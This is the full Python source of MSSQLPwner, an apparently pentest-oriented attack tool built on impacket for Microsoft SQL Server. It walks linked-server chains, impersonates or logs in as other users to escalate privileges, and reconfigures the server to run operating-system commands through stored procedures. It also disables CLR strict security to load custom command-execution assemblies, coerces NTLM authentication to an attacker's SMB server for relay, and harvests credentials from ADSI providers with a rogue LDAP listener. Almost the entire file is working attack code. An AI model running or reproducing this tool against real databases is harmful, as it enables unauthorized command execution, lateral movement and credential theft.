#!/usr/bin/env python
########################################################
__author__ = ['Nimrod Levy']
__license__ = 'GPL v3'
__version__ = 'v1.1'
__email__ = ['El3ct71k@gmail.com']

########################################################
import os
import sys
import copy
import time
import json
import logging
import utilities
from impacket import LOG
from typing import Callable
from impacket import version
from playbooks import Queries
from typing import Literal, Union
from impacket.examples import logger
from base_sql_client import BaseSQLClient
from impacket.examples.utils import parse_target


class MSSQLPwner(BaseSQLClient):
    def __init__(self, server_address, username, args_options):
        super().__init__(server_address, args_options)
        if args_options.debug is True:
            logging.getLogger("impacket").setLevel(logging.DEBUG)
            # Print the Library's installation path
            logging.debug(version.getInstallationPath())
        else:
            logging.getLogger("impacket").setLevel(logging.INFO)

        self.use_state = not args_options.no_state
        self.username = username
        self.server_address = server_address
        self.debug = args_options.debug
        self.state_filename = f"{server_address}_{username}.state"
        self.state = {
            "linkable_servers": dict(), "impersonation_users": dict(), "authentication_users": dict(),
            "impersonation_history": dict(), "authentication_history": dict(),
            "adsi_provider_servers": dict(), "hostname": ""
        }
        self.rev2self = dict()
        self.max_recursive_links = args_options.max_recursive_links

    def retrieve_links(self, linked_server: str, old_state: list = None) -> None:
        """
            This function is responsible to retrieve all the linkable servers recursively.
        """
        state = copy.copy(old_state)
        state = state if state else [linked_server]
        rows = self.build_chain(Queries.LINKABLE_SERVERS, linked_server)
        if not rows['is_success']:
            LOG.warning(f"Failed to retrieve linkable servers from {linked_server}")
            return

        if not rows['results']:
            LOG.info(f"No linkable servers found on {linked_server}")
            return

        for row in rows['results']:
            if not row['SRV_NAME']:
                continue

            linkable_server = utilities.remove_service_name(row['SRV_NAME'].upper())
            is_adsi_provider = True if row['SRV_PROVIDERNAME'].lower() == "adsdsoobject" else False
            linkable_chain_str = f"{' -> '.join(state)} -> {linkable_server}"
            if is_adsi_provider:
                if linkable_chain_str in self.state['adsi_provider_servers'].keys():
                    continue
                LOG.info(f"{linkable_chain_str} is an ADSI provider (can be abused by the retrieve-password module!)")
                self.state['adsi_provider_servers'][linkable_chain_str] = state + [linkable_server]
                continue

            if linkable_server == state[-1]:
                continue

            self.state['linkable_servers'][linkable_chain_str] = state + [linkable_server]
            if linkable_server == self.state['hostname'] or linkable_server in state\
                    or len(state) >= self.max_recursive_links:
                continue
            self.retrieve_links(linkable_chain_str, self.state['linkable_servers'][linkable_chain_str])

    def direct_query(self, query: str, linked_server: str, method: Literal['OpenQuery', 'exec_at'] = "OpenQuery",
                     decode_results: bool = True, print_results: bool = False) -> None:
        """
            This function is responsible to execute a query directly.
        """
        results = self.build_chain(query, linked_server, method, decode_results, print_results)
        if not results['is_success']:
            LOG.error(f"Failed to execute query: {query}")
            return

        for result in results['results']:
            for key, value in result.items():
                LOG.info(f"Result: (Key: {key}) {value}")

    def build_query_chain(self, flow, query: str, method: Literal["exec_at", "OpenQuery", "blind_OpenQuery"]):
        """
        This function is responsible to build a query chain.
        """
        method_func = utilities.build_exec_at if method == "exec_at" else utilities.build_openquery
        chained_query = query

        # If the first server is the current server, remove it
        flow = flow[1:] if flow[0] == self.state['hostname'] else flow
        for link in flow[::-1]:  # Iterates over the linked servers
            chained_query = method_func(link, chained_query)
        return chained_query

    def build_linked_query_chain(self, linked_server: str, query: str,
                                 method: Literal["exec_at", "OpenQuery", "blind_OpenQuery"]) -> Union[str, None]:
        """
        This function is responsible to split a linked server path string in order to build chained queries through the
         linked servers using the OpenQuery or exec function.
        Example:
            Host -> Server1 -> Server2 -> Server3
            OpenQuery(Server1, 'OpenQuery(Server2, ''OpenQuery(Server3, '''query''')'')')
            EXEC ('EXEC (''EXEC ('''query''') AT Server3'') AT Server2') AT Server1
        """
        if not linked_server:
            return query
        if linked_server not in self.state['linkable_servers'].keys():
            LOG.error(f"Server {linked_server} is not linkable from {self.state['hostname']}")
            return None
        return self.build_query_chain(self.state['linkable_servers'][linked_server], query, method)

    def build_chain(self, query: str, linked_server: str,
                    method: Literal['OpenQuery', 'blind_OpenQuery', 'exec_at'] = "OpenQuery",
                    decode_results: bool = True, print_results: bool = False, wait: bool = True) -> dict:
        """
         This function is responsible to build the query chain for the given query and method.
        """
        if linked_server != self.state['hostname']:
            if method == "blind_OpenQuery":
                query = f"SELECT 1; {query}"
            query = self.build_linked_query_chain(linked_server, query, method)
            if not query:
                LOG.error("Failed to build query chain")
                return {'is_success': False, 'results': None}

        return self.custom_sql_query(query, print_results=print_results, decode_results=decode_results, wait=wait)

    def get_impersonation_users(self, linked_server: str) -> None:
        """
        This function is responsible to retrieve all the impersonation users recursively.
        """
        rows = self.build_chain(Queries.CAN_IMPERSONATE_AS, linked_server)
        if not rows['is_success']:
            LOG.warning(f"Failed to retrieve impersonation user list from {linked_server}")
            return

        if linked_server not in self.state['impersonation_users'].keys():
            self.state['impersonation_users'][linked_server] = set()

        for row in rows['results']:
            self.state['impersonation_users'][linked_server].add(row['name'])
            LOG.info(f"Can impersonate as {row['name']} on {linked_server} chain")

    def get_authentication_users(self, linked_server: str) -> None:
        """
        This function is responsible to retrieve all the users that we can authenticate with, recursively.
        """
        rows = self.build_chain(Queries.USER_CONTEXT, linked_server)
        if not rows['is_success']:
            LOG.warning(f"Failed to retrieve authentication user list from {linked_server}")
            return

        if linked_server not in self.state['authentication_users'].keys():
            self.state['authentication_users'][linked_server] = set()

        for row in rows['results']:
            self.state['authentication_users'][linked_server].add(row['username'])
            LOG.info(f"Can authenticate as {row['username']} on {linked_server} chain")

    def retrieve_hostname(self) -> bool:
        """
        This function is responsible to retrieve the hostname of the server.
        """
        row = self.custom_sql_query(Queries.SERVER_HOSTNAME)
        if not row['is_success']:
            LOG.error("Failed to retrieve server hostname")
            return False
        self.state['hostname'] = utilities.remove_service_name(row['results'][0]['ServerName'])
        LOG.info(f"Discovered hostname: {self.state['hostname']}")
        return True

    def enumerate(self) -> bool:
        """
        This function is responsible to enumerate the server.
        """
        if os.path.exists(self.state_filename):
            if self.use_state:
                if input("State file already exists, do you want to use it? (y/n): ").lower() == 'y':
                    self.state = json.load(open(self.state_filename))
                    utilities.print_state(self.state)
                    return True
            os.remove(self.state_filename)

        if not self.retrieve_hostname():
            return False

        self.retrieve_links(self.state['hostname'])
        LOG.info("Linkable servers:")
        for chain in self.state['linkable_servers'].keys():
            LOG.info(f"\t{chain}")

        for linked_server in list(self.state['linkable_servers'].keys()) + [self.state['hostname']]:
            self.get_impersonation_users(linked_server)
            self.get_authentication_users(linked_server)
        utilities.store_state(self.state_filename, self.state)

        return True

    def reconfigure_procedure(self, procedure: str, linked_server: str, required_status: bool) -> bool:
        """
        This function is responsible to enable a procedure on the server.
        """
        procedure_custom_name = utilities.retrieve_procedure_custom_name(procedure)
        is_procedure_enabled = self.build_chain(Queries.IS_PROCEDURE_ENABLED.format(procedure=procedure_custom_name),
                                                linked_server)

        if not is_procedure_enabled['is_success']:
            LOG.error(f"Cant fetch is_{procedure}_enabled status")
            return False

        if not is_procedure_enabled['is_success']:
            LOG.error(f"Cant fetch is_{procedure}_executable status")
            return False

        if is_procedure_enabled['results'][-1]['procedure'] != str(required_status):
            LOG.warning(f"{procedure} need to be changed (Resulted status: {is_procedure_enabled['results'][-1]['procedure']})")
            is_procedure_can_be_configured = self.build_chain(Queries.IS_UPDATE_SP_CONFIGURE_ALLOWED, linked_server)
            if (not is_procedure_can_be_configured['is_success']) or \
                    is_procedure_can_be_configured['results'][0]['CanChangeConfiguration'] == 'False':
                LOG.error(f"Cant fetch sp_configure status")
                return False

            LOG.info(f"{procedure} can be configured")
            query = ""
            status = 1 if required_status else 0
            rev2self_status = 0 if required_status else 1
            query += Queries.RECONFIGURE_PROCEDURE.format(procedure=procedure_custom_name, status=status)
            LOG.info(f"Reconfiguring {procedure}")
            self.add_rev2self_cmd(linked_server,
                                  Queries.RECONFIGURE_PROCEDURE.format(procedure=procedure, status=rev2self_status))

            if not self.build_chain(query, linked_server, method="exec_at")['is_success']:
                LOG.warning(f"Failed to enable {procedure}")
        return True

    def execute_procedure(self, procedure: str, command: str, linked_server: str) -> bool:
        """
        This function is responsible to execute a procedure on a linked server.
        """
        if not self.reconfigure_procedure("show advanced options", linked_server, required_status=True):
            return False

        if not self.reconfigure_procedure(procedure, linked_server, required_status=True):
            return False

        if procedure == 'sp_oacreate':
            procedure_query = Queries.SP_OAMETHOD.format(command=command)
        else:
            procedure_query = Queries.PROCEDURE_EXECUTION.format(procedure=procedure, command=command)

        results = self.build_chain(procedure_query, linked_server, method="exec_at")
        if not results['is_success']:
            LOG.warning(f"Failed to execute {procedure} on {linked_server}")
            return False

        LOG.info(f"The {procedure} command executed successfully on {linked_server}")
        if not results['results']:
            LOG.warning("Failed to resolve the results")
            return results['is_success']

        for result in results['results']:
            for key, value in result.items():
                LOG.info(f"Result: (Key: {key}) {value}")
        return True

    def add_new_custom_asm(self, asm_file_location: str, linked_server: str, asm_name: str):
        """
        This function is responsible to add a new custom assembly to the server.
        """
        if not os.path.exists(asm_file_location):
            LOG.error(f"Cannot find {asm_file_location}")
            return False

        custom_asm_hex = utilities.hexlify_file(asm_file_location)
        if not self.reconfigure_procedure('show advanced options', linked_server, required_status=True):
            LOG.error("Failed to enable show advanced options")
            return False

        if not self.reconfigure_procedure('clr enabled', linked_server, required_status=True):
            LOG.error("Failed to enable clr")
            return False

        if not self.reconfigure_procedure('clr strict security', linked_server, required_status=False):
            LOG.error("Failed to disable clr strict security")
            return False

        my_hash = utilities.calculate_sha512_hash(asm_file_location)
        is_app_trusted = self.build_chain(Queries.IS_MY_APP_TRUSTED.format(my_hash=my_hash), linked_server)
        if (not is_app_trusted['is_success']) or (is_app_trusted['results'][0]['status'] == 'False'):
            trust_asm = self.build_chain(Queries.TRUST_MY_APP.format(my_hash=my_hash), linked_server, method="exec_at")
            if not trust_asm['is_success']:
                LOG.error("Failed to trust our custom assembly")
                return False

            LOG.info(f"Trusting our custom assembly")
            self.add_rev2self_cmd(linked_server, Queries.UNTRUST_MY_APP.format(my_hash=my_hash))

        add_custom_asm = self.build_chain(Queries.ADD_CUSTOM_ASM.format(custom_asm=custom_asm_hex, asm_name=asm_name),
                                          linked_server, method="exec_at")
        if (not add_custom_asm['is_success']) and 'already exists in database' not in add_custom_asm['replay']:
            LOG.error(f"Failed to add custom assembly")
            return False
        return True

    def execute_custom_assembly_procedure(self, asm_file_location: str, procedure_name: str, command: str,
                                          asm_name: str, linked_server: str) -> bool:
        """
        This function is responsible to execute a custom assembly.
        In general this function is starts with creates the assembly, trust it, create the procedure and execute it.
        """

        if not self.add_new_custom_asm(asm_file_location, linked_server, asm_name):
            return False

        add_procedure = self.build_chain(Queries.CREATE_PROCEDURE.format(asm_name=asm_name,
                                                                         procedure_name=procedure_name, arg='command'),
                                         linked_server, method="exec_at")

        if (not add_procedure['is_success']) and 'is already an object named' not in add_procedure['replay']:
            LOG.error(f"Failed to create procedure")
            return False

        self.add_rev2self_cmd(linked_server, Queries.DROP_PROCEDURE.format(procedure_name=procedure_name))
        self.add_rev2self_cmd(linked_server, Queries.DROP_ASSEMBLY.format(asm_name=asm_name))

        procedure_query = Queries.PROCEDURE_EXECUTION.format(procedure=procedure_name, command=command)
        results = self.build_chain(procedure_query, linked_server, method="exec_at")
        if not results['is_success']:
            LOG.error(f"Failed to execute custom assembly")
            return False
        for result in results['results']:
            for key, value in result.items():
                LOG.info(f"Result: (Key: {key}) {value}")
        return True

    def execute_custom_assembly_function(self, asm_file_location: str, function_name: str, class_name: str,
                                         namespace: str, command: str, linked_server: str) -> bool:
        """
        This function is responsible to execute a custom assembly.
        In general this function is starts with creates the assembly, trust it, create the function and execute it.
        """

        if not self.add_new_custom_asm(asm_file_location, linked_server, "FuncAsm"):

            return False

        add_function = self.build_chain(Queries.CREATE_FUNCTION.format(
            function_name=function_name, asm_name='FuncAsm', namespace=namespace,
            class_name=class_name, arg="@port int"),
            linked_server, method="exec_at")

        self.add_rev2self_cmd(linked_server, Queries.DROP_FUNCTION.format(function_name=function_name))
        self.add_rev2self_cmd(linked_server, Queries.DROP_ASSEMBLY.format(asm_name='FuncAsm'))
        if (not add_function['is_success']) and 'is already an object named' not in add_function['replay']:
            LOG.error(f"Failed to create procedure")
            return False

        function_query = Queries.FUNCTION_EXECUTION.format(function_name=function_name, command=command)

        if not self.build_chain(function_query, linked_server, method="OpenQuery", wait=False):
            LOG.error(f"Failed to execute custom assembly")
            return False
        return True

    def impersonate_as(self, linked_server: str) -> bool:
        """
        This function is responsible to impersonate as a user.
        """
        if linked_server not in self.state['impersonation_users'].keys():
            return False

        if linked_server not in self.state['impersonation_history'].keys():
            self.state['impersonation_history'][linked_server] = set()

        for user in self.state['impersonation_users'][linked_server]:
            if user in self.state['impersonation_history'][linked_server]:
                continue

            LOG.info(f"Trying to impersonate as {user} on {linked_server}")
            # Log the impersonated in order to avoid infinite loop
            self.state['impersonation_history'][linked_server].add(user)
            if self.build_chain(Queries.IMPERSONATE_AS_USER.format(username=user), linked_server,
                                method="exec_at")['is_success']:
                LOG.info(f"Successfully impersonated as {user} on {linked_server}")
                return True

        return False

    def authenticate_as(self, linked_server: str) -> bool:
        """
        This function is responsible to authenticate as a user.
        """
        if linked_server not in self.state['authentication_users'].keys():
            return False

        if linked_server not in self.state['authentication_history'].keys():
            self.state['authentication_history'][linked_server] = set()

        for user in self.state['authentication_users'][linked_server]:
            if user in self.state['authentication_history'][linked_server] or user == 'guest':
                continue

            # Log the authenticated user in order to avoid infinite loop
            self.state['authentication_history'][linked_server].add(user)
            LOG.info(f"Trying to authenticate as {user} on {linked_server}")
            if self.build_chain(Queries.AUTHENTICATE_AS_USER.format(username=user), linked_server,
                                method="exec_at")['is_success']:
                LOG.info(f"Successfully authenticated as {user} on {linked_server}")
                return True

        return False

    def filter_relevant_chains(self, linked_server: str) -> list:
        """
        This function is responsible to filter the relevant chains.
        """
        sorted_dict = dict(sorted(self.state['linkable_servers'].items(), key=lambda item: len(item[1])))

        for chain_str, chain_list in sorted_dict.items():
            if chain_list[-1] != linked_server:
                continue

            yield chain_str, chain_list

    def add_rev2self_cmd(self, linked_server: str, cmd: str) -> None:
        """
        This function is responsible to add a command to the rev2self queue.
        """
        if linked_server not in self.rev2self.keys():
            self.rev2self[linked_server] = []
        self.rev2self[linked_server].append(cmd)

    def rev2self_cmd(self) -> None:
        """
        This function is responsible to revert the database to the previous state.
        """
        if not self.rev2self:
            return
        LOG.info("Reverting to self..")
        for linked_server, command in self.rev2self.items():
            if not command:
                continue
            if self.build_chain("".join(command), linked_server, "exec_at")['is_success']:
                LOG.info(f"Successfully reverted to self on {linked_server}")
            self.rev2self[linked_server].clear()

    def procedure_runner(self, func: Callable, args: list, linked_server: str) -> bool:
        """
        This function is responsible to attempt to run a procedure through local or link server.
        This function will try  to run the procedure through the following methods if no success:
        1. Execute the procedure locally.
        2. Impersonate as a user and execute the procedure.
        3. Authenticate as a user and execute the procedure.

        """

        if func(*args, **{"linked_server": linked_server}):
            return True

        while self.impersonate_as(linked_server):
            self.build_chain(Queries.REVERT, linked_server, method="exec_at")
            if func(*args, **{"linked_server": linked_server}):
                return True

        while self.authenticate_as(linked_server):
            if func(*args, **{"linked_server": linked_server}):
                return True

        if func(*args, **{"linked_server": linked_server}):
            return True

        return False

    def procedure_chain_builder(self, func: Callable, args: list, linked_server: str) -> bool:
        """
        This function is responsible to build a procedure chain.
        """

        if (not linked_server) or linked_server == self.state['hostname']:
            retval = self.procedure_runner(func, args, linked_server)
            if retval:
                LOG.info(f"Successfully executed {func.__name__} on {linked_server}")
                return True

            LOG.error(f"{func.__name__} cannot be executed on {linked_server}")
            LOG.info("Trying to find a linkable server chain")

        for chain_str, _ in self.filter_relevant_chains(linked_server):
            LOG.info(f"Trying to execute {func.__name__} on {chain_str}")
            if self.procedure_runner(func, args, linked_server=chain_str):
                LOG.info(f"Successfully executed {func.__name__} on {chain_str}")
                return True

        LOG.warning(f"Failed to execute {func.__name__} on {linked_server}")
        return False

    def retrieve_adsi_chain_password(self, linked_server: str, adsi_provider: str):
        for _, chain in self.state['adsi_provider_servers'].items():
            if adsi_provider and adsi_provider.upper() != chain[-1]:
                continue
            if linked_server != chain[-2]:
                continue
            yield chain

    def retrieve_password(self, linked_server: str, port: int, adsi_provider: str):
        is_discovered = False
        ldap_filename = "LdapServer-x64.dll" if options.arch == 'x64' else "LdapServer-x86.dll"
        ldap_file_location = os.path.join("playbooks/custom-asm", ldap_filename)
        adsi_provider = adsi_provider
        for chain in self.retrieve_adsi_chain_password(linked_server, adsi_provider):
            is_discovered = True
            if self.procedure_chain_builder(self.execute_custom_assembly_function,
                                            [ldap_file_location, "listen", "LdapSrv", "ldapAssembly",
                                             str(port)],
                                            linked_server=linked_server):
                time.sleep(1)
                client = MSSQLPwner(self.server_address, self.username, self.options)
                client.options.debug = False
                LOG.setLevel(logging.ERROR)
                client.connect(username, password, domain)
                LOG.setLevel(logging.INFO)
                client.options.debug = self.options.debug
                chained_query = self.build_query_chain(chain, Queries.LDAP_QUERY.format(port=port), "OpenQuery")

                client.custom_sql_query(chained_query, wait=True)
                client.disconnect()
                tds_data = self.ms_sql.recvTDS()
                self.ms_sql.replies = self.ms_sql.parseReply(tds_data['Data'], False)

                results = self.parse_logs()
                if results and results['is_success']:
                    LOG.info(f"Successfully retrieved password from {' -> '.join(chain)}")
                    for credentials in results['results'][0].values():
                        LOG.info(f"[+] Discovered credentials: {credentials}")
                break

        if not is_discovered:
            LOG.error(f"Failed to access ADSI provider on {linked_server}")


if __name__ == '__main__':
    # Init the example's logger theme
    logger.init()

    parser = utilities.generate_arg_parser()

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    if not options.target:
        LOG.error("target must be supplied!")
        exit()

    domain, username, password, address = parse_target(options.target)

    if domain is None:
        domain = ''

    if password == '' and username != '' and options.hashes is None \
            and options.no_pass is False and options.aesKey is None:
        from getpass import getpass

        password = getpass("Password:")

    if options.aesKey is not None:
        options.k = True
    mssql_client = MSSQLPwner(address, username, options)
    if not mssql_client.connect(username, password, domain):
        sys.exit(1)
    if not mssql_client.enumerate():
        sys.exit(1)
    link_server = options.link_server.upper() if options.link_server else mssql_client.state['hostname']

    if options.module == "enumerate":
        mssql_client.disconnect()
        sys.exit(1)

    elif options.module == 'exec':
        mssql_client.procedure_chain_builder(mssql_client.execute_procedure,
                                             [options.command_execution_method, options.command],
                                             linked_server=link_server)
    elif options.module == 'ntlm-relay':
        mssql_client.procedure_chain_builder(mssql_client.execute_procedure,
                                             [options.relay_method, options.smb_server],
                                             linked_server=link_server)

    elif options.module == 'custom-asm':
        asm_filename = "CmdExec-x64.dll" if options.arch == 'x64' else "CmdExec-x86.dll"
        file_location = os.path.join("playbooks/custom-asm", asm_filename)
        mssql_client.procedure_chain_builder(mssql_client.execute_custom_assembly_procedure,
                                             [file_location, options.procedure_name, options.command, "CalcAsm"],
                                             linked_server=link_server)

    elif options.module == 'direct_query':
        mssql_client.procedure_chain_builder(mssql_client.direct_query,
                                             [options.query],
                                             linked_server=link_server)

    elif options.module == 'retrieve-password':
        mssql_client.retrieve_password(link_server, options.listen_port, options.adsi_provider)

    mssql_client.rev2self_cmd()
    mssql_client.disconnect()
